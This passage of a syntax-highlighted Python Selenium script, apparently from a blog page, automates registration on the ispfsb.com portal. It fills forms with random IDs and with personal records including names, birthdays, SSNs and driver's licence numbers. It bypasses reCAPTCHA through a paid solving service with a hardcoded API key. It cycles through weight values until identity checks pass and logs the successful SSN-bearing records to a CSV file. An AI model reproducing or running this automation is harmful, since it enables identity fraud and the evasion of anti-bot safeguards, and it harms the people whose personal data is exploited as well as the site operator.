class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>,</span><br><span class="line">                                    <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">                                    <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;M&#x27;</span>], <span class="number">8</span>)</span><br><span class="line">                <span class="built_in">id</span> = <span class="string">&#x27;&#x27;</span>.join(ID)</span><br><span class="line">                User_ID = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;txtUserID&quot;]&#x27;</span>)</span><br><span class="line">                User_ID.click()</span><br><span class="line">                User_ID.send_keys(<span class="built_in">id</span>)</span><br><span class="line">                driver.implicitly_wait(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 输入随机邮箱</span></span><br><span class="line">                Email_Address = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;txtEmailAddress&quot;]&#x27;</span>)</span><br><span class="line">                Email_Address.click()</span><br><span class="line">                Email_Address.send_keys(<span class="built_in">id</span>+<span class="string">&quot;@163.com&quot;</span>)</span><br><span class="line">                driver.implicitly_wait(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 创建密码</span></span><br><span class="line">                Password1 = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;txtPassword&quot;]&#x27;</span>)</span><br><span class="line">                Password1.click()</span><br><span class="line">                Password1.send_keys(<span class="string">&quot;ASDFasgh###555&quot;</span>)</span><br><span class="line">                driver.implicitly_wait(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 确认密码</span></span><br><span class="line">                Password2 = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;txtPasswordConfirm&quot;]&#x27;</span>)</span><br><span class="line">                Password2.click()</span><br><span class="line">                Password2.send_keys(<span class="string">&#x27;ASDFasgh###555&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 下拉滚动条到底</span></span><br><span class="line">                driver.execute_script(<span class="string">&quot;window.scrollTo(0,document.body.scrollHeight)&quot;</span>)</span><br><span class="line">                time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 问题1</span></span><br><span class="line">                Question1 = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;drpSecQuestion1&quot;]&#x27;</span>)</span><br><span class="line">                Question1.click()</span><br><span class="line">                Select(driver.find_element_by_id(<span class="string">&#x27;drpSecQuestion1&#x27;</span>)).select_by_value(<span class="string">&#x27;14&#x27;</span>)</span><br><span class="line">                driver.implicitly_wait(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 输入随机ID</span></span><br><span class="line">                ID = random.sample([<span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">                                    <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>,</span><br><span class="line">                                    <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">                                    <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;M&#x27;</span>], <span class="number">8</span>)</span><br><span class="line">                <span class="built_in">id</span> = <span class="string">&#x27;&#x27;</span>.join(ID)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 问题1答案</span></span><br><span class="line">                Answer1 = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;txtQuestion1&quot;]&#x27;</span>)</span><br><span class="line">                Answer1.click()</span><br><span class="line">                Answer1.send_keys(<span class="built_in">id</span>)</span><br><span class="line">                driver.implicitly_wait(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 问题2</span></span><br><span class="line">                Question2 = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;drpSecQuestion2&quot;]&#x27;</span>)</span><br><span class="line">                Question2.click()</span><br><span class="line">                Select(driver.find_element_by_id(<span class="string">&#x27;drpSecQuestion2&#x27;</span>)).select_by_value(<span class="string">&#x27;11&#x27;</span>)</span><br><span class="line">                driver.implicitly_wait(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 输入随机ID</span></span><br><span class="line">                ID = random.sample([<span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">                                    <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>,</span><br><span class="line">                                    <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">                                    <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;M&#x27;</span>], <span class="number">8</span>)</span><br><span class="line">                <span class="built_in">id</span> = <span class="string">&#x27;&#x27;</span>.join(ID)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 问题2答案</span></span><br><span class="line">                Answer2 = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;txtQuestion2&quot;]&#x27;</span>)</span><br><span class="line">                Answer2.click()</span><br><span class="line">                Answer2.send_keys(<span class="built_in">id</span>)</span><br><span class="line">                driver.implicitly_wait(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 问题3</span></span><br><span class="line">                Question3 = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;drpSecQuestion3&quot;]&#x27;</span>)</span><br><span class="line">                Question3.click()</span><br><span class="line">                Select(driver.find_element_by_id(<span class="string">&#x27;drpSecQuestion3&#x27;</span>)).select_by_value(<span class="string">&#x27;10&#x27;</span>)</span><br><span class="line">                driver.implicitly_wait(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 输入随机ID</span></span><br><span class="line">                ID = random.sample([<span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">                                    <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>,</span><br><span class="line">                                    <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">                                    <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;M&#x27;</span>], <span class="number">8</span>)</span><br><span class="line">                <span class="built_in">id</span> = <span class="string">&#x27;&#x27;</span>.join(ID)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 问题3答案</span></span><br><span class="line">                Answer3 = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;txtQuestion3&quot;]&#x27;</span>)</span><br><span class="line">                Answer3.click()</span><br><span class="line">                Answer3.send_keys(<span class="built_in">id</span>)</span><br><span class="line">                driver.implicitly_wait(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 问题4</span></span><br><span class="line">                Question4 = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;drpSecQuestion4&quot;]&#x27;</span>)</span><br><span class="line">                Question4.click()</span><br><span class="line">                Select(driver.find_element_by_id(<span class="string">&#x27;drpSecQuestion4&#x27;</span>)).select_by_value(<span class="string">&#x27;13&#x27;</span>)</span><br><span class="line">                driver.implicitly_wait(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 输入随机ID</span></span><br><span class="line">                ID = random.sample([<span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">                                    <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>,</span><br><span class="line">                                    <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">                                    <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;M&#x27;</span>], <span class="number">8</span>)</span><br><span class="line">                <span class="built_in">id</span> = <span class="string">&#x27;&#x27;</span>.join(ID)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 问题4答案</span></span><br><span class="line">                Answer4 = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;txtQuestion4&quot;]&#x27;</span>)</span><br><span class="line">                Answer4.click()</span><br><span class="line">                Answer4.send_keys(<span class="built_in">id</span>)</span><br><span class="line">                driver.implicitly_wait(<span class="number">5</span>)</span><br><span class="line">                <span class="comment"># print(&quot;准备2秒后验证.............&quot;)</span></span><br><span class="line">                <span class="comment">#</span></span><br><span class="line">                <span class="comment"># time.sleep(2)</span></span><br><span class="line"></span><br><span class="line">                html = driver.page_source</span><br><span class="line">                <span class="comment"># print(html)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment"># driver.find_element_by_css_selector(&#x27;#recaptcha-anchor &gt; div.recaptcha-checkbox-border&#x27;).click()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 点击人机验证   打码平台</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># input(&quot;信息填完后按回车:&quot;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;开始打码.......................................................&quot;</span>)</span><br><span class="line">                task_id = create_task()</span><br><span class="line">                task_id = polling_task(task_id)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;task_id:&quot;</span>, task_id)</span><br><span class="line">                js_code = <span class="string">&#x27;document.getElementById(&quot;g-recaptcha-response&quot;).innerHTML=&quot;&#123;&#125;&quot;;&#x27;</span>.<span class="built_in">format</span>(task_id)</span><br><span class="line">                <span class="built_in">print</span>(js_code)</span><br><span class="line">                driver.execute_script(js_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment"># a = input(&#x27;人工智能验证中：&#x27;)</span></span><br><span class="line">                <span class="comment"># time.sleep(2)</span></span><br><span class="line">                <span class="comment">#</span></span><br><span class="line">                <span class="comment"># # 点击验证码</span></span><br><span class="line">                <span class="comment"># ActionChains(driver).move_by_offset(392, 820).click().perform()  # 鼠标左键点击</span></span><br><span class="line">                <span class="comment"># time.sleep(2)</span></span><br><span class="line">                <span class="comment"># # 点击人头</span></span><br><span class="line">                <span class="comment"># ActionChains(driver).move_by_offset(444, 1006).click().perform()  # 鼠标左键点击</span></span><br><span class="line">                <span class="comment"># # 等待5秒  通过验证</span></span><br><span class="line">                <span class="comment"># time.sleep(5)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 点击Next</span></span><br><span class="line">                driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;btnNext&quot;]&#x27;</span>).click()</span><br><span class="line">                driver.implicitly_wait(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment"># *****************************************************************************************************************************</span></span><br><span class="line">                <span class="comment"># 第二页</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># ActionChains(driver).move_by_offset(1765, 266).click().perform()  # 鼠标左键点击一律不</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment"># last name</span></span><br><span class="line">                last1 = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;txtLast&quot;]&#x27;</span>)</span><br><span class="line">                last1.click()</span><br><span class="line">                last1.clear()</span><br><span class="line">                last1.send_keys(i[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">                <span class="comment"># first name</span></span><br><span class="line">                first = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;txtFirst&quot;]&#x27;</span>)</span><br><span class="line">                first.click()</span><br><span class="line">                first.send_keys(i[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Middle</span></span><br><span class="line">                Middle = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;txtMiddle&quot;]&#x27;</span>)</span><br><span class="line">                Middle.click()</span><br><span class="line">                Middle.send_keys(i[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 出生日期</span></span><br><span class="line">                bir = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;txtDOB&quot;]&#x27;</span>)</span><br><span class="line">                bir.click()</span><br><span class="line">                bir.send_keys(i[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Eye Color</span></span><br><span class="line">                Eye_Color = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;drpEyeColor&quot;]&#x27;</span>)</span><br><span class="line">                Eye_Color.click()</span><br><span class="line">                Select(driver.find_element_by_id(<span class="string">&#x27;drpEyeColor&#x27;</span>)).select_by_value(<span class="string">&#x27;BLU&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 随机10位数电话号码</span></span><br><span class="line">                <span class="comment"># nums = random.sample([&#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;], 4)</span></span><br><span class="line">                num = <span class="string">&quot;2562131565&quot;</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 下拉滚动条到底</span></span><br><span class="line">                driver.execute_script(<span class="string">&quot;window.scrollTo(0,document.body.scrollHeight)&quot;</span>)</span><br><span class="line">                time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Primary Phone</span></span><br><span class="line">                Primary_Phone = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;txtPhone&quot;]&#x27;</span>)</span><br><span class="line">                Primary_Phone.click()</span><br><span class="line">                Primary_Phone.send_keys(num)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># ID State</span></span><br><span class="line">                ID_State = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;drpIDStateDisplay&quot;]&#x27;</span>)</span><br><span class="line">                ID_State.click()</span><br><span class="line">                Select(driver.find_element_by_id(<span class="string">&#x27;drpIDStateDisplay&#x27;</span>)).select_by_value(<span class="string">&#x27;IL&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># ID Type</span></span><br><span class="line">                ID_Type = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;drpIDType&quot;]&#x27;</span>)</span><br><span class="line">                ID_Type.click()</span><br><span class="line">                Select(driver.find_element_by_id(<span class="string">&#x27;drpIDType&#x27;</span>)).select_by_value(<span class="string">&#x27;OL&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># ID Number</span></span><br><span class="line">                ID_Number = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;txtIDNumber&quot;]&#x27;</span>)</span><br><span class="line">                ID_Number.click()</span><br><span class="line">                ID_Number.send_keys(i[-<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 隐式等待</span></span><br><span class="line">                driver.implicitly_wait(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Weight as displayed on your Drivers License</span></span><br><span class="line">                tizhong = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;txtWeight&quot;]&#x27;</span>)</span><br><span class="line">                tizhong.click()</span><br><span class="line">                tizhong.clear()</span><br><span class="line">                tizhong.send_keys(j+<span class="number">10</span>)</span><br><span class="line">                <span class="built_in">print</span>(j)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># over</span></span><br><span class="line">                driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;btnNext&quot;]&#x27;</span>).click()</span><br><span class="line"></span><br><span class="line">                html = driver.page_source</span><br><span class="line">                soup = BeautifulSoup(html,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">                hahas = soup.select(<span class="string">&#x27;#phTitle&#x27;</span>)</span><br><span class="line">                haha_re = <span class="string">&#x27;i&gt; (.*?) &lt;i&#x27;</span></span><br><span class="line">                haha_geshi = re.<span class="built_in">compile</span>(haha_re, re.S)</span><br><span class="line">                haha = re.findall(haha_geshi, <span class="built_in">str</span>(hahas))[<span class="number">0</span>]</span><br><span class="line">                <span class="built_in">print</span>(haha)</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">type</span>(haha))</span><br><span class="line">                <span class="keyword">if</span> haha == <span class="string">&quot;hahah&quot;</span>: <span class="comment"># &quot;名&quot;, &quot;中间名&quot;, &quot;姓&quot;, &quot;地址&quot;, &quot;生日&quot;, &quot;ssn&quot;, &quot;驾照&quot;,&quot;体重&quot;</span></span><br><span class="line">                    f_csv.writerow(</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="string">&#x27;名&#x27;</span>: i[<span class="number">0</span>],</span><br><span class="line">                            <span class="string">&#x27;中间名&#x27;</span>: i[<span class="number">1</span>],</span><br><span class="line">                            <span class="string">&#x27;姓&#x27;</span>: i[<span class="number">2</span>],</span><br><span class="line">                            <span class="string">&#x27;地址&#x27;</span>: i[<span class="number">3</span>],</span><br><span class="line">                            <span class="string">&#x27;生日&#x27;</span>: i[<span class="number">4</span>],</span><br><span class="line">                            <span class="string">&#x27;ssn&#x27;</span>: i[<span class="number">5</span>],</span><br><span class="line">                            <span class="string">&#x27;驾照&#x27;</span>: i[<span class="number">6</span>],</span><br><span class="line">                            <span class="string">&#x27;体重&#x27;</span>:j</span><br><span class="line">                        &#125;</span><br><span class="line">                    )</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;名:&#x27;</span>+i[<span class="number">0</span>]+<span class="string">&#x27;\n&#x27;</span>+<span class="string">&#x27;中间名&#x27;</span>+i[<span class="number">1</span>]+<span class="string">&#x27;\n&#x27;</span>+<span class="string">&#x27;姓:&#x27;</span>+ i[<span class="number">2</span>]+<span class="string">&#x27;\n&#x27;</span>+<span class="string">&#x27;地址:&#x27;</span>+i[<span class="number">3</span>]+<span class="string">&#x27;\n&#x27;</span>+<span class="string">&#x27;生日:&#x27;</span>+i[<span class="number">4</span>]+<span class="string">&#x27;\n&#x27;</span>+<span class="string">&#x27;ssn:&#x27;</span>+i[<span class="number">5</span>]+<span class="string">&#x27;\n&#x27;</span>+<span class="string">&#x27;驾照:&#x27;</span>+i[<span class="number">6</span>]+<span class="string">&#x27;\n&#x27;</span>+<span class="string">&#x27;体重:&#x27;</span>+j)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;已写入...&quot;</span>)</span><br><span class="line">                    driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;btnHome&quot;]&#x27;</span>).click()</span><br><span class="line">                    driver.implicitly_wait(<span class="number">20</span>)</span><br><span class="line">                    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># Learn More</span></span><br><span class="line">                    driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;home1&quot;]/section/div/div[2]/div/a[2]&#x27;</span>).click()</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;btnHome&quot;]&#x27;</span>).click()</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 递归</span></span><br><span class="line">        <span class="comment"># get(driver)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">response</span>):</span></span><br><span class="line">    url = <span class="string">&quot;https://www.ispfsb.com/Reg/signup.aspx&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&quot;g-recaptcha-response&quot;</span>: response&#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_task</span>():</span></span><br><span class="line">    url = <span class="string">&#x27;http://api.recaptcha.press/task/create?siteKey=6LdAHv8UAAAAAC-KuK02qHMG7nLPZ3WpxZs7eG6K&amp;siteReferer=https://www.ispfsb.com/&amp;authorization=0a389ac1-ab1a-4d60-a089-1f182bd12461&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            data = response.json()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;response data:&#x27;</span>, data)</span><br><span class="line">            <span class="keyword">return</span> data.get(<span class="string">&#x27;data&#x27;</span>, &#123;&#125;).get(<span class="string">&#x27;taskId&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;create task failed&#x27;</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">polling_task</span>(<span class="params">task_id</span>):</span></span><br><span class="line">    url2 = <span class="string">&#x27;https://api.recaptcha.press/task/status?taskId=%s&#x27;</span> % task_id</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt; <span class="number">60</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(url2)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                data = response.json()</span><br><span class="line">                <span 